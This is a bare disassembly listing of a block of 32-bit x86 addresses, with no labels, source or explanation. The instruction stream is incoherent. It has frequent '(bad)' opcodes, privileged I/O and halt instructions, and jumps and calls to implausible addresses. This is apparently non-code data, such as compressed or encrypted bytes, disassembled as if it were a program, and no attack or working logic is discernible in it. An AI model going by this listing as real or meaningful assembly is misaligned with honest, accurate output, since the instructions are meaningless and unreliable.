  42415b:	loopne 0x424142
  42415d:	aad    0x8
  42415f:	cli    
  424160:	call   0xc4fefb37
  424165:	imul   esp
  424167:	mov    ch,0xdb
  424169:	int3   
  42416a:	into   
  42416b:	out    0xf0,eax
  42416d:	out    dx,eax
  42416e:	mov    ah,0xba
  424170:	ror    edi,cl
  424172:	mov    ebp,0xd3f3dc03
  424177:	add    BYTE PTR [edx],cl
  424179:	rol    DWORD PTR [esi],0xef
  42417c:	fucomip st,st(7)
  42417e:	clc    
  42417f:	jmp    0x424162
  424181:	push   cs
  424182:	lods   al,BYTE PTR ds:[esi]
  424183:	jmp    0xf0e1:0xc6cab0ec
  42418a:	mov    bh,0xb6
  42418c:	mov    edx,0xcdf8edac
  424191:	clc    
  424192:	(bad)  
  424193:	mov    esp,0xe505f2d2
  424198:	sti    
  424199:	clc    
  42419a:	hlt    
  42419b:	pop    es
  42419c:	loope  0x42418c
  42419e:	lds    eax,FWORD PTR [eax]
  4241a0:	int3   
  4241a1:	enter  0xafbd,0xeb
  4241a5:	out    0xc5,al
  4241a7:	repz loopne 0x42419b
  4241aa:	mov    ebx,0xeee4deb6
  4241af:	cli    
  4241b0:	mov    esp,0xd4d5dcff
  4241b5:	fmul   st,st(5)
  4241b7:	rol    dl,1
  4241b9:	out    0xd9,eax
  4241bb:	add    bh,dl
  4241bd:	mov    esp,0xe7130bce
  4241c2:	loop   0x424189
  4241c4:	mov    edi,0xe2accadd
  4241c9:	repz shl DWORD PTR [ebp-0xe3a0d22],cl
  4241d0:	out    dx,al
  4241d1:	(bad)  
  4241d2:	cmc    
  4241d3:	lock fst st(0)
  4241d6:	int3   
  4241d7:	cli    
  4241d8:	sar    bh,1
  4241da:	loopne 0x4241c6
  4241dc:	(bad)  
  4241de:	in     eax,dx
  4241df:	add    al,0x3
  4241e1:	or     DWORD PTR [esi-0x4c364e40],ebp
  4241e7:	shl    bh,1
  4241e9:	cli    
  4241ea:	fnstenv [ebp-0x2837272e]
  4241f0:	clc    
  4241f1:	mov    edx,0xfcbfe303
  4241f6:	add    al,0xd0
  4241f8:	aad    0xe2
  4241fa:	fsub   st,st(7)
  4241fc:	or     esp,edx
  4241fe:	std    
  4241ff:	in     eax,dx
  424200:	fdivr  st,st(6)
  424202:	(bad)  
  424203:	scas   al,BYTE PTR es:[edi]
  424204:	jecxz  0x4241d4
  424206:	shl    ecx,cl
  424208:	repz out 0xd8,al
  42420b:	iret   
  42420c:	mov    ecx,0xf7eff8e4
  424211:	out    dx,eax
  424212:	cli    
  424213:	sti    
  424214:	repnz fdiv st,st(7)
  424217:	fadd   QWORD PTR [eax]
  424219:	cld    
  42421a:	ret    
  42421b:	add    al,0x5
  42421d:	or     eax,0xedcec5fb
  424222:	shl    DWORD PTR [eax-0x103e3230],0xd5
  424229:	ret    0xe7ca
  42422c:	fmul   st,st(6)
  42422e:	cld    
  42422f:	(bad)  
  424231:	aam    0xc2
  424233:	div    DWORD PTR [ebp+0x3e5d2fc]
  424239:	lock jmp 0xe4280d21
  42423f:	out    0xca,al
  424241:	pop    es
  424242:	test   al,0xb3
  424244:	mul    dh
  424246:	into   
  424247:	fsub   st(7),st
  424249:	retf   
  42424a:	mov    bl,0xff
  42424c:	jmp    0x424214
  42424e:	int3   
  42424f:	mov    dh,0xbf
  424251:	(bad)  
  424253:	out    dx,al
  424254:	aam    0xc3
  424256:	cmc    
  424257:	in     eax,0x6
  424259:	cmc    
  42425a:	loop   0x424244
  42425c:	std    
  42425d:	std    
  42425e:	add    dh,bl
  424260:	(bad)  
  424261:	stc    
  424262:	jmp    0xadae:0xb3e0c5dd
  424269:	cmc    
  42426a:	mov    ch,0xb2
  42426c:	mov    edi,0xeafeecfd
  424271:	jmp    0xe104:0xd2fabdef
  424278:	ror    dl,cl
  42427a:	or     bl,ah
  42427c:	ror    BYTE PTR [ecx],0xf4
  42427f:	jmp    0xafc2:0xcfabf2c5
  424286:	xlat   BYTE PTR ds:[ebx]
  424287:	test   dl,0xa8
  42428a:	sti    
  42428b:	mov    al,0xc9
  42428d:	sar    BYTE PTR [esi-0x29000c46],1
  424293:	add    ch,ah
  424295:	repz inc cl
  424298:	(bad)  
  42429a:	jmp    0xd3ea:0xcdf4e6d4
  4242a1:	clc    
  4242a2:	(bad)  
  4242a3:	rol    edx,cl
  4242a5:	call   0xcf102d8f
  4242aa:	iret   
  4242ab:	xlat   BYTE PTR ds:[ebx]
  4242ac:	mov    ebp,0xcdb5f8bf
  4242b2:	leave  
  4242b3:	std    
  4242b4:	cli    
  4242b5:	mov    esp,0xc7f7fbf0
  4242ba:	retf   
  4242bb:	ret    0xffd7
  4242be:	fucom  st(3)
  4242c0:	ror    DWORD PTR [ebx],cl
  4242c2:	fst    st(3)
  4242c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c5:	out    dx,eax
  4242c6:	jmp    0x424294
  4242c8:	lods   eax,DWORD PTR ds:[esi]
  4242c9:	in     al,0xd8
  4242cb:	(bad)  
  4242cc:	hlt    
  4242cd:	mov    edx,0xbee2d1f9
  4242d2:	fucomp st(0)
  4242d4:	test   BYTE PTR [edx],0xf4
  4242d7:	idiv   edx
  4242d9:	loope  0x4242d4
  4242db:	jmp    0xf4624e5
  4242e0:	jecxz  0x4242bc
  4242e2:	test   al,0xaf
  4242e4:	mov    bh,0xdd
  4242e6:	loopne 0x4242d2
  4242e8:	(bad)
  4242eb:	hlt    
  4242ec:	in     al,0xb4
  4242ee:	retf   0xffe4
  4242f1:	mov    esp,0xdaf4dcbb
  4242f6:	out    0xf3,eax
  4242f8:	(bad)  
  4242fa:	or     dh,dh
  4242fc:	out    dx,al
  4242fd:	add    cl,BYTE PTR [ebx+ecx*1]
  424300:	cld    
  424301:	add    eax,0xb3dfb3bd
  424306:	scas   eax,DWORD PTR es:[edi]
  424307:	retf   
  424308:	retf   
  424309:	into   
  42430a:	(bad)  
  42430b:	aam    0xc7
  42430d:	leave  
  42430e:	fst    st(4)
  424310:	iret   
  424311:	mov    edi,0xdd07f8f5
  424316:	loopne 0x4242f2
  424318:	idiv   bl
  42431a:	(bad)  
  42431b:	fcmovb st,st(6)
  42431d:	in     al,0x5
  42431f:	call   0xcf14452c
  424324:	in     al,0xc4
  424326:	rcl    bl,1
  424328:	ror    ah,cl
  42432a:	out    0xd7,al
  42432c:	mov    bh,0xf5
  42432e:	aam    0xfd
  424330:	fdiv   st,st(4)
  424332:	mov    ebx,0xfff1c103
  424337:	rcl    edx,cl
  424339:	jmp    0x424305
  42433b:	push   es
  42433c:	mov    ebp,0xdbfbc4fb
  424341:	add    al,0xcb
  424343:	faddp  st(1),st
  424345:	in     al,0xcb
  424347:	out    0xce,eax
  424349:	sti    
  42434a:	cmc    
  42434b:	retf   0xcbe8
  42434e:	(bad)  
  424350:	mov    ah,0xe2
  424352:	fcmovnbe st,st(3)
  424354:	sti    
  424355:	int    0x6
  424357:	rol    bl,cl
  424359:	add    al,0x5
  42435b:	fcompp 
  42435d:	(bad)  
  42435f:	jmp    0xd92b3071
  424364:	in     al,0xd3
  424366:	int    0xeb
  424368:	icebp  
  424369:	iret   
  42436a:	(bad)
  42436d:	cmc    
  42436e:	enter  0xcbed,0xdd
  424372:	(bad)  
  424374:	std    
  424375:	lock push es
  424377:	hlt    
  424378:	ret    
  424379:	loope  0x42437c
  42437b:	jmp    0xe444661
  424380:	out    0xf1,al
  424382:	mov    esi,0xc6cba8bc
  424387:	test   cl,0xc2
  42438a:	jmp    0xf8bf:0xeaf5bae4
  424391:	fadd   st,st(1)
  424393:	cld    
  424394:	add    al,cl
  424396:	(bad)  
  424397:	icebp  
  424398:	hlt    
  424399:	inc    bl
  42439b:	test   BYTE PTR [edi],0xb
  42439e:	aad    0xdc
  4243a0:	add    al,0xc8
  4243a2:	jmp    0x42438b
  4243a4:	mov    dl,0xeb
  4243a6:	shl    al,0xf4
  4243a9:	mov    bl,0xf2
  4243ab:	out    dx,al
  4243ac:	fcmovbe st,st(2)
  4243ae:	int    0xcf
  4243b0:	test   BYTE PTR [edx],0xdb
  4243b3:	mov    esi,0xf3fc07cc
  4243b8:	cmc    
  4243b9:	sti    
  4243ba:	add    eax,0xe204c90f
  4243bf:	loopne 0x4243ac
  4243c1:	out    0xbc,al
  4243c3:	leave  
  4243c4:	(bad)  
  4243c5:	repz int 0xed
  4243c8:	mov    bl,0xe9
  4243ca:	retf   
  4243cb:	int3   
  4243cc:	retf   
  4243cd:	(bad)  
  4243cf:	clc    
  4243d0:	hlt    
  4243d1:	out    dx,eax
  4243d2:	mov    eax,0xbcf7e7f8
  4243d7:	add    al,dh
  4243d9:	out    0xf4,eax
  4243db:	lds    edi,FWORD PTR [ebp-0x22260036]
  4243e1:	out    dx,al
  4243e2:	in     al,0xf2
  4243e4:	ffreep st(6)
  4243e6:	out    0xd3,eax
  4243e8:	sti    
  4243e9:	in     eax,dx
  4243ea:	in     eax,dx
  4243eb:	mov    al,0xeb
  4243ed:	jmp    0xf6d1:0xfceccbc5
  4243f4:	pop    es
  4243f5:	mov    esp,0xddf401e2
  4243fa:	ret    0xe2f0
  4243fd:	fcos   
  4243ff:	ud2    
  424401:	iret   
  424402:	retf   
  424403:	mov    ebp,0xdcefa4f1
  424408:	mov    dl,0xe1
  42440a:	mov    ecx,0xf9e6f2ce
  42440f:	fdiv   st,st(7)
  424411:	mov    esi,0xf9def9fb
  424416:	(bad)  
  424417:	icebp  
  424418:	icebp  
  424419:	loopne 0x424412
  42441b:	std    
  42441c:	pop    es
  42441d:	ror    al,0x7
  424420:	adc    ah,bl
  424422:	rol    esi,cl
  424424:	in     eax,0xb2
  424426:	mov    bl,0xac
  424428:	mov    dl,0xac
  42442a:	repz enter 0xd5d3,0xbb
  42442f:	(bad)  
  424431:	(bad)  
  424432:	jmp    0xf11b00ed
  424437:	add    esp,ecx
  424439:	add    ebx,ebp
  42443b:	jmp    0xe405:0xfe01fdf5
  424442:	int3   
  424443:	ror    dh,1
  424445:	ror    bh,1
  424447:	loopne 0x42440a
  424449:	sar    eax,0xd8
  42444c:	mov    al,0xb8
  42444e:	repnz iret 
  424450:	cld    
  424451:	retf   0xd0fc
  424454:	(bad)  
  424455:	fadd   st,st(3)
  424457:	sar    cl,cl
  424459:	hlt    
  42445a:	cld    
  42445b:	pavgb  mm3,mm6
  42445e:	fisttp DWORD PTR [ecx*1-0x1f2732fe]
  424465:	cmc    
  424466:	mov    al,0xec
  424468:	iret   
  424469:	ret    0xfaf3
  42446c:	in     al,dx
  42446d:	(bad)  
  42446e:	retf   0xd0e3
  424471:	mov    ebx,0xd1b9d902
  424476:	add    al,0x0
  424478:	fild   DWORD PTR [esi]
  42447a:	(bad)  
  42447b:	sar    ch,1
  42447d:	(bad)  
  42447f:	(bad)  
  424481:	retf   0xb2dd
  424484:	(bad)  
  424486:	out    0xc7,eax
  424488:	(bad)  
  424489:	jmp    0xbb3d0b42
  42448e:	int    0xf6
  424490:	repz mov ebp,0xe1f407c1
  424496:	fld    DWORD PTR [edi]
  424498:	or     ebx,ecx
  42449a:	shl    ebp,1
  42449c:	jmp    0xc1eb:0xdce208ff
  4244a3:	shr    DWORD PTR [eax-0x2c512d2b],1
  4244a9:	fcomi  st,st(4)
  4244ab:	repnz out dx,al
  4244ad:	icebp  
  4244ae:	hlt    
  4244af:	fucomi st,st(7)
  4244b1:	add    ecx,esp
  4244b3:	pop    es
  4244b4:	shl    esp,cl
  4244b6:	add    al,dh
  4244b8:	rol    bh,cl
  4244ba:	in     eax,0xdd
  4244bc:	std    
  4244bd:	loop   0x424482
  4244bf:	out    dx,eax
  4244c0:	loope  0x4244bf
  4244c2:	mov    esp,0xe3c4c6c7
  4244c8:	out    0xe0,eax
  4244ca:	sti    
  4244cb:	mov    edx,0xffbdf9d6
  4244d0:	leave  
  4244d1:	iret   
  4244d2:	lock ror esi,cl
  4244d5:	cmc    
  4244d6:	(bad)  
  4244d7:	aad    0xde
  4244d9:	out    0xc0,al
  4244db:	retf   0xbdc
  4244de:	or     ecx,DWORD PTR [edx+eiz*8]
  4244e1:	int3   
  4244e2:	mov    edi,0xd3c6d7ed
  4244e7:	shl    BYTE PTR [ebx-0x244d2f06],0xe4
  4244ee:	fcmove st,st(7)
  4244f0:	lock div ch
  4244f3:	(bad)  
  4244f5:	push   es
  4244f6:	lock fld DWORD PTR [edi]
  4244f9:	add    al,0xd5
  4244fb:	out    0xc5,al
  4244fd:	or     esp,eax
  4244ff:	or     al,0xe3
  424501:	out    0xcd,eax
  424503:	mov    al,0xe6
  424505:	(bad)
  424508:	iret   
  424509:	(bad)  
  42450a:	not    dl
  42450c:	into   
  42450d:	jmp    0x4244db
  42450f:	fucomp st(5)
  424511:	mov    ecx,0x7c7facc
  424516:	int3   
  424517:	loope  0x4244fa
  424519:	cmc    
  42451a:	rol    BYTE PTR [esi],0xf6
  42451d:	(bad)  
  42451e:	(bad)  
  42451f:	out    dx,al
  424520:	in     eax,0x6
  424522:	mov    bl,0xe1
  424524:	mov    al,0xc8
  424526:	in     al,dx
  424527:	out    dx,al
  424528:	in     al,0xfa
  42452a:	(bad)  
  42452b:	cmc    
  42452c:	dec    esp
  42452e:	mov    esi,0xd2b9f7be
  424533:	stc    
  424534:	rol    esi,cl
  424536:	icebp  
  424537:	in     al,0xbc
  424539:	jecxz  0x42451c
  42453b:	xlat   BYTE PTR ds:[ebx]
  42453c:	add    al,0xea
  42453e:	leave  
  42453f:	sti    
  424540:	(bad)
  424543:	stos   BYTE PTR es:[edi],al
  424544:	scas   al,BYTE PTR es:[edi]
  424545:	test   al,0xc6
  424547:	enter  0xd7da,0xc5
  42454b:	enter  0xd9d9,0xf0
  42454f:	mov    esp,0xd7f2d7bc
  424554:	mov    ch,0xdf
  424556:	sti    
  424557:	xlat   BYTE PTR ds:[ebx]
  424558:	ffree  st(5)
  42455a:	ret    0xe7fe
  42455d:	loope  0x424537
  42455f:	jecxz  0x42454b
  424561:	int    0xd2
  424563:	ret    
  424564:	scas   al,BYTE PTR es:[edi]
  424565:	iret   
  424566:	aad    0xb1
  424568:	(bad)  
  424569:	test   al,0xb3
  42456b:	lock cli 
  42456d:	div    dl
  42456f:	in     al,dx
  424570:	fdiv   st,st(6)
  424572:	ret    0xfc03
  424575:	xlat   BYTE PTR ds:[ebx]
  424576:	mov    ebx,0xd8cbf5d8
  42457b:	aam    0xd8
  42457d:	shr    dl,0x4
  424580:	add    al,0xa
  424582:	fsubr  DWORD PTR [eax-0x43320c43]
  424588:	loope  0x424532
  42458a:	in     al,0xb6
  42458c:	xlat   BYTE PTR ds:[ebx]
  42458d:	fcmovnbe st,st(0)
  42458f:	(bad)  
  424590:	out    dx,eax
  424591:	int3   
  424592:	fsub   st(4),st
  424594:	pop    es
  424595:	mov    esi,0xe2c7e0c6
  42459a:	loope  0x42459e
  42459c:	leave  
  42459d:	hlt    
  42459e:	enter  0x907,0xca
  4245a2:	fmulp  st(3),st
  4245a4:	jecxz  0x42456b
  4245a6:	into   
  4245a7:	icebp  
  4245a8:	int    0xd3
  4245aa:	iret   
  4245ab:	clc    
  4245ac:	stc    
  4245ad:	(bad)  
  4245ae:	fsubp  st(2),st
  4245b0:	mov    cl,0xe9
  4245b2:	hlt    
  4245b3:	fxch   st(5)
  4245b5:	int3   
  4245b6:	in     eax,dx
  4245b7:	in     eax,0xc6
  4245b9:	(bad)  
  4245bb:	fcmovnu st,st(6)
  4245bd:	in     eax,0xcf
  4245bf:	add    al,0x12
  4245c1:	into   
  4245c2:	ret    
  4245c3:	retf   0xb3d2
  4245c6:	xlat   BYTE PTR ds:[ebx]
  4245c7:	ret    0xe6ee
  4245ca:	(bad)  
  4245cc:	mov    edx,0xf4dedcde
  4245d1:	add    ah,al
  4245d3:	aam    0xd1
  4245d5:	mov    ah,0xc0
  4245d7:	fstp   TBYTE PTR [ebp-0x1bf5091d]
  4245dd:	into   
  4245de:	fadd   QWORD PTR [eax]
  4245e0:	add    cl,BYTE PTR [edx]
  4245e2:	mov    esp,0xd4e7deb1
  4245e7:	iret   
  4245e8:	mov    dh,0xc9
  4245ea:	clc    
  4245eb:	(bad)  
  4245ec:	cmc    
  4245ed:	mov    bh,0xea
  4245ef:	fsubp  st(4),st
  4245f1:	hlt    
  4245f2:	out    dx,eax
  4245f3:	repz rcr esp,cl
  4245f6:	add    edx,ecx
  4245f8:	mov    esp,0xff02f7f7
  4245fd:	cli    
  4245fe:	add    dh,ah
  424600:	or     esi,esp
  424602:	jmp    0xd2083df6
  424607:	loopne 0x4245e3
  424609:	mov    ah,0xcb
  42460b:	icebp  
  42460c:	out    dx,eax
  42460d:	(bad)  
  42460e:	iret   
  42460f:	out    dx,eax
  424610:	cmc    
  424611:	call   0xd34435f6
  424616:	mov    ebx,0xe205bceb
  42461b:	dec    ebx
  42461d:	jmp    0xfd51231e
  424622:	test   eax,0xcac4ebd1
  424627:	mov    bh,0xd1
  424629:	retf   0xdbc5
  42462c:	mov    edx,0x2c8facd
  424631:	shr    ebp,cl
  424633:	fmul   st(7),st
  424635:	xlat   BYTE PTR ds:[ebx]
  424636:	sti    
  424637:	aam    0xc0
  424639:	pop    es
  42463a:	add    cl,BYTE PTR [edx]
  42463c:	or     edx,esp
  42463e:	sti    
  42463f:	add    eax,0xa8e40d0f
  424644:	scas   eax,DWORD PTR es:[edi]
  424645:	out    0xc6,al
  424647:	mov    ch,0xc9
  424649:	in     al,dx
  42464a:	mov    al,0xf8
  42464c:	(bad)  
  42464e:	retf   
  42464f:	mov    ah,0x2
  424651:	leave  
  424652:	mov    ecx,0x4e703d1
  424657:	repz fiadd WORD PTR [eax]
  42465a:	jecxz  0x424642
  42465c:	(bad)  
  42465e:	(bad)  
  42465f:	(bad)  
  424660:	or     DWORD PTR [ebx],edx
  424662:	jmp    0x42464c
  424664:	in     al,0xa8
  424666:	fst    st(1)
  424668:	out    dx,al
  424669:	iret   
  42466a:	mov    ecx,0xf6acb4fa
  42466f:	sti    
  424670:	sti    
  424671:	out    dx,al
  424672:	mov    eax,0xbbf2f102
  424677:	mov    esi,0xdb09ffe5
  42467c:	loop   0x424642
  42467e:	enter  0x5da,0xb
  424682:	jmp    0xd0ee:0xcae2b2cf
  424689:	out    dx,eax
  42468a:	mul    esp
  42468c:	lods   eax,DWORD PTR ds:[esi]
  42468d:	fcmove st,st(4)
  42468f:	fsubrp st(3),st
  424691:	stc    
  424692:	(bad)  
  424693:	lock inc dh
  424696:	aam    0xd6
  424698:	add    bl,cl
  42469a:	fmulp  st(3),st
  42469c:	push   esi
  42469e:	add    eax,edx
  4246a0:	into   
  4246a1:	leave  
  4246a2:	mov    cl,0xe5
  4246a4:	scas   al,BYTE PTR es:[edi]
  4246a5:	scas   eax,DWORD PTR es:[edi]
  4246a6:	jmp    0xbfda:0xead0e8d6
  4246ad:	mov    ebx,0xe9b5b6c4
  4246b2:	sar    dl,cl
  4246b4:	mov    esp,0xe4d1fad4
  4246b9:	or     ecx,DWORD PTR [ebx]
  4246bb:	or     esp,ebx
  4246bd:	enter  0x10b,0xc4
  4246c1:	or     eax,0xf6c1d0b1
  4246c6:	jmp    0xcae7:0xf3cab4ea
  4246cd:	std    
  4246ce:	rcl    esp,1
  4246d0:	in     eax,dx
  4246d1:	repz repnz rcr dh,cl
  4246d5:	pop    es
  4246d6:	fnclex 
  4246d8:	lock add dh,bl
  4246db:	aad    0xdf
  4246dd:	or     esi,eax
  4246df:	pop    es
  4246e0:	into   
  4246e1:	(bad)  
  4246e2:	fucom  st(7)
  4246e4:	jmp    0x4246a6
  4246e6:	loope  0x4246c3
  4246e8:	in     eax,0xf1
  4246ea:	fcmovne st,st(5)
  4246ec:	retf   
  4246ed:	fidiv  WORD PTR [edi+esi*8-0xa272e0d]
  4246f4:	ret    0x1e2
  4246f7:	mov    esp,0xf6d6f4cb
  4246fc:	add    al,ch
  4246fe:	retf   0x80e
  424701:	jecxz  0x4246ef
  424703:	out    dx,eax
  424704:	test   eax,0xc1b1b3b3
  424709:	(bad)  
  42470b:	fcmovne st,st(6)
  42470d:	(bad)  
  42470e:	stc    
  42470f:	mov    ch,0xb5
  424711:	fcomip st,st(0)
  424713:	sar    BYTE PTR [eax-0x3c211d44],0xe1
  42471a:	rol    ebp,1
  42471c:	in     eax,0xfe
  42471e:	fcmovnbe st,st(4)
  424720:	or     esp,ebx
  424722:	loope  0x424713
  424724:	mov    ebp,0xd6ecabe4
  424729:	vpsubsw ymm6,ymm5,YMMWORD PTR [ecx-0x45140f35]
  424731:	fcmovbe st,st(5)
  424733:	jecxz  0x42472d
  424735:	(bad)  
  424737:	mov    ebp,0xe904f1cb
  42473c:	(bad)  
  42473e:	(bad)  
  42473f:	ficom  WORD PTR [edx]
  424741:	(bad)  [edi-0x160c2f0d]
  424747:	scas   al,BYTE PTR es:[edi]
  424748:	les    esi,FWORD PTR [esi-0x5305260b]
  42474e:	icebp  
  42474f:	mov    esi,0xfebdd8d1
  424754:	push   es
  424755:	fcom   st(5)
  424757:	faddp  st(7),st
  424759:	div    ebp
  42475b:	out    dx,eax
  42475c:	or     edi,edi
  42475e:	add    ebp,ecx
  424760:	pop    es
  424761:	fdiv   DWORD PTR [ecx-0x3a501032]
  424767:	out    dx,al
  424768:	fucomi st,st(3)
  42476a:	mov    dl,0xeb
  42476c:	in     eax,dx
  42476d:	mov    al,0xf5
  42476f:	repnz int3 
  424771:	lock fidivr DWORD PTR [ebx+eax*8-0x21333922]
  424779:	(bad)  
  42477a:	(bad)  
  42477b:	stc    
  42477c:	loopne 0x424752
  42477e:	fmul   st(5),st
  424780:	or     BYTE PTR [eax+ebp*4],cl
  424783:	icebp  
  424784:	test   al,0xee
  424786:	int3   
  424787:	in     al,dx
  424788:	into   
  424789:	mov    bl,0xd9
  42478b:	hlt    
  42478c:	jmp    0xc4343286
  424791:	sar    DWORD PTR [edx-0x2f3f2627],cl
  424797:	loope  0x4247a3
  424799:	repnz sti 
  42479b:	shl    dl,1
  42479d:	hlt    
  42479e:	loop   0x424784
  4247a0:	into   
  4247a1:	add    al,0xc0
  4247a3:	mov    esi,0xd0b5eaa9
  4247a8:	shl    BYTE PTR [ebp-0x35313f2d],0xf6
  4247af:	stc    
  4247b0:	call   0xd8162478
  4247b5:	loopne 0x424778
  4247b7:	std    
  4247b8:	loop   0x4247b6
  4247ba:	fisttp WORD PTR [ebx]
  4247bc:	(bad)  
  4247be:	jmp    0xaf3045ac
  4247c3:	(bad)  
  4247c4:	(bad)  
  4247c6:	idiv   BYTE PTR [ebp+eiz*8-0x43b0a4c]
  4247cd:	retf   
  4247ce:	mov    bh,0xdb
  4247d0:	idiv   BYTE PTR [ebp-0x6320647]
  4247d6:	pop    es
  4247d7:	rol    dh,cl
  4247d9:	cmc    
  4247da:	(bad)  
  4247db:	retf   
  4247dc:	dec    BYTE PTR [edx]
  4247de:	add    DWORD PTR [edi+ecx*8],ecx
  4247e1:	shl    cl,cl
  4247e3:	out    dx,al
  4247e4:	(bad)  
  4247e6:	in     eax,dx
  4247e7:	into   
  4247e8:	lods   al,BYTE PTR ds:[esi]
  4247e9:	loope  0x4247d2
  4247eb:	(bad)  
  4247ec:	repnz mov eax,0xd7d9e3eb
  4247f2:	cmc    
  4247f3:	cmc    
  4247f4:	sti    
  4247f5:	loopne 0x4247c8
  4247f7:	test   DWORD PTR [ebx],0xf606e1d5
  4247fd:	loop   0x4247ca
  4247ff:	sti    
  424800:	fxch   st(1)
  424802:	jmp    0xe60cfaeb
  424807:	out    0xf4,al
  424809:	jmp    0xad1808e4
  42480e:	in     eax,dx
  42480f:	retf   0xfbd6
  424812:	cli    
  424813:	enter  0x5d4,0xdd
  424817:	add    ah,dl
  424819:	test   ebx,0x20eebc9
  42481f:	enter  0xfec8,0xee
  424823:	stos   BYTE PTR es:[edi],al
  424824:	jmp    0xee3a1efe
  424829:	mov    bl,0xf8
  42482b:	mov    cl,0xe7
  42482d:	jmp    0x442141c
  424832:	mov    eax,0xdef1fcdf
  424837:	add    BYTE PTR [edx],cl
  424839:	aad    0xfd
  42483b:	ret    0xcaeb
  42483e:	add    al,0xfa
  424840:	jmp    0x424855
  424842:	fld    st(5)
  424844:	mov    edi,0xe0cdf2cc
  424849:	mov    bl,0xec
  42484b:	aam    0xdb
  42484d:	sti    
  42484e:	in     eax,0xbb
  424850:	leave  
  424851:	mov    ebx,0xc7fed9f4
  424856:	ret    0xdbf9
  424859:	fisttp WORD PTR [ebx]
  42485b:	in     eax,0xdd
  42485d:	jmp    0x424849
  42485f:	into   
  424860:	or     al,BYTE PTR [edi]
  424862:	int3   
  424863:	loopne 0x42484f
  424865:	(bad)  
  424866:	shr    al,1
  424868:	loope  0x42485b
  42486a:	mov    ecx,0xbbd4ebed
  42486f:	stc    
  424870:	icebp  
  424871:	enter  0xf2fb,0xcd
  424875:	fidivr WORD PTR [edi-0x3b05fc3a]
  42487b:	fld    QWORD PTR [edx]
  42487d:	aam    0xed
  42487f:	ret    0xedf
  424882:	stos   DWORD PTR es:[edi],eax
  424883:	mov    dl,0xcf
  424885:	mov    al,0xea
  424887:	in     eax,0xeb
  424889:	(bad)
  42488d:	retf   0xf4f5
  424890:	mov    cl,0xde
  424892:	into   
  424893:	enter  0xdfbe,0xcc
  424897:	cld    
  424898:	stc    
  424899:	(bad)  
  42489b:	mul    ah
  42489d:	(bad)  
  42489e:	in     eax,0xe3
  4248a0:	in     eax,dx
  4248a1:	jmp    0xc4cf:0xc8b3e1cb
  4248a8:	repnz mul edi
  4248ab:	(bad)  
  4248ac:	(bad)  
  4248ad:	jmp    0xccec:0x1b5d2bd
  4248b4:	jmp    edx
  4248b6:	lock (bad) 
  4248b8:	aad    0xd2
  4248ba:	les    ecx,FWORD PTR [edi]
  4248bc:	add    esp,eax
  4248be:	stc    
  4248bf:	jecxz  0x4248c8
  4248c1:	icebp  
  4248c2:	fadd   st,st(2)
  4248c4:	rcl    ebp,cl
  4248c6:	xlat   BYTE PTR ds:[ebx]
  4248c7:	jmp    0xb50a3ebd
  4248cc:	(bad)  
  4248ce:	(bad)  
  4248cf:	in     eax,dx
  4248d0:	in     eax,dx
  4248d1:	repnz enter 0xf0c0,0xf7
  4248d6:	rol    DWORD PTR [edi],1
  4248d8:	mov    ebp,0x1c4f0e1
  4248dd:	por    mm5,mm6
  4248e0:	(bad)  
  4248e1:	stc    
  4248e2:	enter  0xc6de,0xee
  4248e6:	stos   DWORD PTR es:[edi],eax
  4248e7:	mov    cl,0xf3
  4248e9:	shl    edx,1
  4248eb:	leave  
  4248ec:	iret   
  4248ed:	in     al,0xce
  4248ef:	test   esp,0xccdacee9
  4248f5:	int3   
  4248f6:	(bad)  
  4248f8:	loope  0x4248ef
  4248fa:	(bad)  
  4248fb:	in     al,0xf7
  4248fd:	add    ebp,esi
  4248ff:	out    0xef,eax
  424901:	stc    
  424902:	call   0xc7f630da
  424907:	loopne 0x4248df
  424909:	ror    al,cl
  42490b:	rcl    al,0xf9
  42490e:	mov    edi,0xddccb5d6
  424913:	icebp  
  424914:	lock add esi,ecx
  424917:	mov    edx,0xc7cae4d8
  42491c:	fmul   QWORD PTR [edx]
  42491e:	loope  0x4248e4
  424920:	int    0xe8
  424922:	stos   BYTE PTR es:[edi],al
  424923:	mov    al,0xed
  424925:	ffree  st(1)
  424927:	mov    ah,0xd0
  424929:	call   0xc9091820
  42492e:	out    dx,al
  42492f:	call   ecx
  424931:	(bad)  
  424933:	mov    dh,0x7
  424935:	mov    ebp,0x5eadaf2
  42493a:	clc    
  42493b:	jmp    0x42492c
  42493d:	loopne 0x424902
  42493f:	fisttp DWORD PTR ds:0xd0d7c7fd
  424945:	into   
  424946:	lds    esi,FWORD PTR [edi-0x443a0a1b]
  42494c:	rcr    al,1
  42494e:	rcr    edi,1
  424950:	sar    DWORD PTR [esi-0x38fd2f3d],cl
  424956:	mov    esp,0xfbd5f3ec
  42495b:	(bad)  
  42495c:	or     DWORD PTR ds:0xff80bed,eax
  424962:	icebp  
  424963:	leave  
  424964:	loopne 0x42492e
  424966:	(bad)  
  424967:	int    0xf1
  424969:	retf   0xe8e9
  42496c:	cmc    
  42496d:	into   
  42496e:	in     al,0xd0
  424970:	leave  
  424971:	call   0xc73f0234
  424976:	loope  0x424972
  424978:	aad    0xd2
  42497a:	in     al,0xe8
  42497c:	sti    
  42497d:	or     ah,dh
  42497f:	in     eax,dx
  424980:	retf   
  424981:	out    dx,eax
  424982:	stos   DWORD PTR es:[edi],eax
  424983:	test   al,0xe9
  424985:	repnz repnz repnz cli 
  424989:	mov    edx,0xc4bff9f4
  42498e:	fcomi  st,st(0)
  424990:	stc    
  424991:	in     al,dx
  424992:	cld    
  424993:	stc    
  424994:	jecxz  0x424995
  424996:	loopne 0x42495b
  424998:	xlat   BYTE PTR ds:[ebx]
  424999:	or     bl,bl
  42499b:	fucom  st(4)
  42499d:	or     bh,al
  42499f:	jmp    0xf30c2696
  4249a4:	repz iret 
  4249a6:	loop   0x42498b
  4249a8:	out    0xf4,al
  4249aa:	rcr    cl,1
  4249ac:	repnz fxch st(6)
  4249af:	clc    
  4249b0:	cli    
  4249b1:	mov    esp,0xf3d5feff
  4249b6:	sar    BYTE PTR [edx-0x2f2a4305],cl
  4249bc:	loop   0x4249a6
  4249be:	iret   
  4249bf:	enter  0xf907,0xd3
  4249c3:	jecxz  0x424986
  4249c5:	ret    0xe2ab
  4249c8:	ror    ebx,1
  4249ca:	fdiv   DWORD PTR [eax-0xc040405]
  4249d0:	(bad)  
  4249d2:	(bad)  
  4249d3:	fild   DWORD PTR [ebx]
  4249d5:	aad    0x2
  4249d7:	add    al,0xd6
  4249d9:	fnclex 
  4249db:	in     al,0xe0
  4249dd:	mov    BYTE PTR [eax],0xf9
